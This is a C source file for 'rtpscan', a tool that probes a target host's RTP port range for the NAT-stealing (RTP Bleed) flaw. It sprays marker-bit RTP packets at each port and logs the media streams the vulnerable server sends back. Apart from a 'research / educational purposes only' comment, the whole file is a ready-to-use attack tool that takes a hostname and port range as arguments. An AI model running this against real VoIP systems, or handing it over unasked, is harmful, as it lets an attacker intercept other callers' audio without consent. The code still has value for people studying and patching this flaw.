/*
 * Copyright 2017 kapejod, all rights reserved.
 *
 * Scanner for RTP NAT stealing vulnerability, for research / educational purposes only!
 * Works only on big endian machines and ipv4 targets.
 */
 
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <pthread.h>

#include "rtp.h"
#include "rtpp_time.h"

static uint64_t
random64(void)
{
    return (((uint64_t)random() << 32) | random());
}

struct sockaddr_in *create_peer(char *host, int port) {
  struct sockaddr_in *addr = NULL;
  struct hostent *hp = NULL;
  addr = malloc(sizeof(struct sockaddr_in));
  if (!addr) {
    printf("create_peer: unable to malloc peer address\n");
    return NULL;
  }
  memset(addr, 0, sizeof(struct sockaddr_in));
  hp = gethostbyname(host);
  if (!hp) {
    printf("create_peer: unable to resolv host (%s)\n", host);
    free(addr);
    return NULL;
  }

  addr->sin_family = AF_INET;
  addr->sin_port = htons(port);
  bzero(&(addr->sin_zero), 8);
  bcopy(hp->h_addr,(char *)&addr->sin_addr, hp->h_length);
  return addr;
}

struct rtp_receiver_stats {
  pthread_mutex_t lock;
  double last_recv_ts;
};

struct rtp_scan_args {
  int ppp;
  int payload_size;
  int payload_type;
  int udp_socket;
  uint64_t ssrc_seed;
  uint64_t seq_seed;
  uint64_t ts_seed;
  struct rtp_receiver_stats *rrsp;
};

static void *
rtp_receiver(void *targ)
{
  const struct rtp_scan_args *rrap;
  union {
    struct rtp_hdr hdr;
    char raw[512];
  } response;
  struct sockaddr_in sender;
  socklen_t sender_len = sizeof(sender);

  rrap = (const struct rtp_scan_args *)targ;

  for (;;) {
    int bytes_received = recvfrom(rrap->udp_socket, &response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_len);
    if (bytes_received >= 12) {
      pthread_mutex_lock(&rrap->rrsp->lock);
      rrap->rrsp->last_recv_ts = getdtime();
      pthread_mutex_unlock(&rrap->rrsp->lock);
      uint16_t seq = ntohs(response.hdr.seq);
      printf("received %d bytes from target port %d, seq %u\n", bytes_received, ntohs(sender.sin_port), seq);
    }
  }
}

void rtp_scan(char *host, int port_range_start, int port_range_end, struct rtp_scan_args *rsap) {
  struct sockaddr_in *target;
  union {
    struct rtp_hdr hdr;
    char raw[sizeof(struct rtp_hdr) + 512];
  } packet;
  int port;
  int loops;
  struct rtp_receiver_stats rrs = {.last_recv_ts = getdtime()};
  pthread_t rthr;
  int pps = 10000;
  struct rtp_pt_profile pt_prof;

  rsap->rrsp = &rrs;
  if (rtp_pt_info(rsap->payload_type, &pt_prof) != 0) {
    printf("rtp_pt_info(%d) failed\n", rsap->payload_type);
    return;
  }
  if ((rsap->payload_size % pt_prof.bytes_per_frame) != 0) {
    printf("invalid payload size(%d), should be multiple of %d\n", rsap->payload_size, pt_prof.bytes_per_frame);
    return;
  }
  int tsstep = RTP_SRATE * (rsap->payload_size / pt_prof.bytes_per_frame) * pt_prof.ticks_per_frame / 1000;

  target = create_peer(host, port_range_start);
  if (!target) return;

  rsap->udp_socket = socket(PF_INET, SOCK_DGRAM, 0);
  if (rsap->udp_socket == -1) {
    printf("unable to create udp socket\n");
    goto e0;
  }

  memset(&packet, 0, sizeof(packet));
  packet.hdr.version = 2; // RTP version 2
  packet.hdr.pt = rsap->payload_type;
  packet.hdr.mbt = 1; // marker bit set

  if (pthread_mutex_init(&rrs.lock, NULL) != 0) {
    printf("unable to create receiver mutex\n");
    goto e1;
  }
  if (pthread_create(&rthr, NULL, rtp_receiver, (void *)rsap) != 0) {
    printf("unable to create receiver thread\n");
    goto e2;
  }

  printf("scanning %s ports %d to %d with %d packets per port and %d bytes of payload type %d\n",
   host, port_range_start, port_range_end, rsap->ppp, rsap->payload_size, rsap->payload_type);
  for (port = port_range_start; port < port_range_end; port += 2) {
    target->sin_port = htons(port);
    packet.hdr.ssrc = rsap->ssrc_seed % (((uint32_t)port << 14) | (port >> 1));
    uint16_t seq = rsap->seq_seed % (((uint32_t)port << 14) | (port >> 1));
    uint32_t ts = rsap->ts_seed % (((uint32_t)port << 14) | (port >> 1));
    for (loops = 0; loops < rsap->ppp; loops++) {
      packet.hdr.seq = htons(seq + loops); // increase seq with every packet
      packet.hdr.ts = htonl(ts + (loops * tsstep));
      sendto(rsap->udp_socket, &packet, sizeof(struct rtp_hdr) + rsap->payload_size, 0, (const struct sockaddr *)target, sizeof(struct sockaddr_in));
      usleep(1000000 / pps);
    }
  }

  for (;;) {
    pthread_mutex_lock(&rrs.lock);
    double last_recv_ts = rrs.last_recv_ts;
    pthread_mutex_unlock(&rrs.lock);
    if (getdtime() - last_recv_ts > 5.0)
        break;
  }

e2:
  pthread_mutex_destroy(&rrs.lock);
e1:
  close(rsap->udp_socket);
e0:
  free(target);
}

int main(int argc, char *argv[]) {
  struct rtp_scan_args rra = {
    .ppp = 4,
    .payload_size = 160,
    .payload_type = RTP_PCMA,
    .ssrc_seed = random64(),
    .seq_seed = random64(),
    .ts_seed = random64()
  };

  if (argc < 4) {
    printf("syntax: rtpscan hostname port_range_start port_range_end [packets_per_port] [payload_size] [payload_type]\n");
    return -1;
  }
  if (argc >= 5) rra.ppp = atoi(argv[4]);
  if (argc >= 6) rra.payload_size = atoi(argv[5]);
  if (argc == 7) rra.payload_type = atoi(argv[6]);

  rtp_scan(argv[1], atoi(argv[2]), atoi(argv[3]), &rra);
  return 0;
}
